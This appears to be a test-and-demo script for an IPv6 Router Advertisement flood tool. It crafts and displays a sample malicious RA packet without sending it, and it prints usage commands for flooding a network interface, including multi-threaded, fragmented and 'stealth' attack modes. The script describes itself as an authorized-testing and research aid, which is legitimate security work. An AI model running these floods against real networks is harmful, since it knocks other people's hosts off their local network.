#!/usr/bin/env python3
"""
IPv6 RA Flood Test and Demo Script
---------------------------------
Comprehensive testing and demonstration of the RA flood attack
"""

import sys
import time
import argparse
from pathlib import Path

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

try:
    from utils import random_mac, mac_to_link_local
    from network_discovery import get_network_interfaces, print_interface_info
    from capture import TrafficAnalyzer
    print("[+] All modules loaded successfully")
    ALL_MODULES_AVAILABLE = True
except ImportError as e:
    print(f"[-] Module import error: {e}")
    print("[!] Some features may not be available")
    ALL_MODULES_AVAILABLE = False

def test_utility_functions():
    """Test basic utility functions."""
    print("\n" + "="*50)
    print("TESTING UTILITY FUNCTIONS")
    print("="*50)
    
    # Test MAC generation
    print("Testing MAC address generation:")
    for i in range(5):
        mac = random_mac()
        print(f"  MAC {i+1}: {mac}")
    
    # Test MAC to link-local conversion
    print("\nTesting MAC to Link-Local conversion:")
    test_macs = [
        "02:00:00:ab:cd:ef",
        "02:11:22:33:44:55", 
        "02:aa:bb:cc:dd:ee"
    ]
    
    for mac in test_macs:
        try:
            ll_addr = mac_to_link_local(mac)
            print(f"  {mac} -> {ll_addr}")
        except Exception as e:
            print(f"  {mac} -> ERROR: {e}")

def test_network_discovery():
    """Test network interface discovery."""
    if not ALL_MODULES_AVAILABLE:
        print("\n[-] Network discovery not available - missing dependencies")
        return
        
    print("\n" + "="*50)
    print("TESTING NETWORK DISCOVERY")
    print("="*50)
    
    try:
        interfaces = get_network_interfaces()
        print(f"Found {len(interfaces)} network interfaces:")
        
        for iface in interfaces[:3]:  # Show first 3 interfaces
            print(f"  {iface['name']}: {iface['mac']} ({'UP' if iface['is_up'] else 'DOWN'})")
            if iface['ipv6_addrs']:
                print(f"    IPv6: {iface['ipv6_addrs'][0]}")
    except Exception as e:
        print(f"[-] Network discovery error: {e}")

def demo_packet_structure():
    """Demonstrate packet structure without sending."""
    print("\n" + "="*50)
    print("PACKET STRUCTURE DEMONSTRATION")
    print("="*50)
    
    try:
        # Import here to avoid import errors
        from scapy.all import Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo
        
        # Create a sample packet
        src_mac = random_mac()
        dst_mac = "33:33:00:00:00:01"
        src_ll = mac_to_link_local(src_mac)
        dst_ip = "ff02::1"
        
        pkt = (Ether(dst=dst_mac, src=src_mac) /
               IPv6(src=src_ll, dst=dst_ip) /
               ICMPv6ND_RA(chlim=64, H=1, routerlifetime=0) /
               ICMPv6NDOptPrefixInfo(prefixlen=64, L=1, A=1,
                                     validlifetime=0xffffffff,
                                     preferredlifetime=0xffffffff,
                                     prefix="2001:db8::"))
        
        print("Sample RA packet structure:")
        print(pkt.summary())
        print("\nPacket details:")
        pkt.show()
        
    except ImportError:
        print("[-] Scapy not available - cannot demonstrate packet structure")
    except Exception as e:
        print(f"[-] Error creating packet: {e}")

def run_safe_test():
    """Run a safe test without actually sending packets."""
    print("\n" + "="*50)
    print("SAFE FUNCTIONALITY TEST")
    print("="*50)
    
    print("[+] Testing packet generation (no transmission)...")
    
    # Generate some test packets
    packet_count = 5
    for i in range(packet_count):
        try:
            mac = random_mac()
            ll_addr = mac_to_link_local(mac)
            print(f"  Packet {i+1}: MAC={mac}, LL={ll_addr}")
        except Exception as e:
            print(f"  Packet {i+1}: ERROR - {e}")
    
    print(f"[+] Successfully generated {packet_count} packet configurations")

def print_usage_examples():
    """Print usage examples."""
    print("\n" + "="*50)
    print("USAGE EXAMPLES")
    print("="*50)
    
    examples = [
        "# List available network interfaces",
        "sudo python src/ra_flood.py --list-interfaces",
        "",
        "# Basic RA flood (requires root)",
        "sudo python src/ra_flood.py -i eth0 -c 100",
        "",
        "# High-speed multi-threaded attack",
        "sudo python src/ra_flood.py -i eth0 --fast --threads 8 --fragment",
        "",
        "# Rate-limited attack with capture",
        "sudo python src/ra_flood.py -i eth0 -r 50 --capture",
        "",
        "# Stealth mode with all features",
        "sudo python src/ra_flood.py -i eth0 --stealth --random-mtu --fragment",
        "",
        "# Monitor victim system (run on target)",
        "sudo ./scripts/victim_logs.sh eth0",
    ]
    
    for example in examples:
        print(example)

def main():
    parser = argparse.ArgumentParser(description="IPv6 RA Flood Test Suite")
    parser.add_argument("--test", choices=["all", "utils", "network", "packet"], 
                       default="all", help="Test to run")
    parser.add_argument("--no-packet-demo", action="store_true",
                       help="Skip packet structure demonstration")
    args = parser.parse_args()
    
    print("IPv6 Router Advertisement Flood - Test Suite")
    print("=" * 60)
    print("Educational and Security Research Tool")
    print("⚠️  For authorized testing only!")
    print("=" * 60)
    
    if args.test in ["all", "utils"]:
        test_utility_functions()
    
    if args.test in ["all", "network"]:
        test_network_discovery()
    
    if args.test in ["all", "packet"] and not args.no_packet_demo:
        demo_packet_structure()
    
    if args.test == "all":
        run_safe_test()
        print_usage_examples()
    
    print("\n" + "="*50)
    print("TEST COMPLETE")
    print("="*50)
    print("✅ Basic functionality verified")
    print("📖 See README.md for complete usage instructions")
    print("⚠️  Remember: Root privileges required for actual packet sending")

if __name__ == "__main__":
    main()
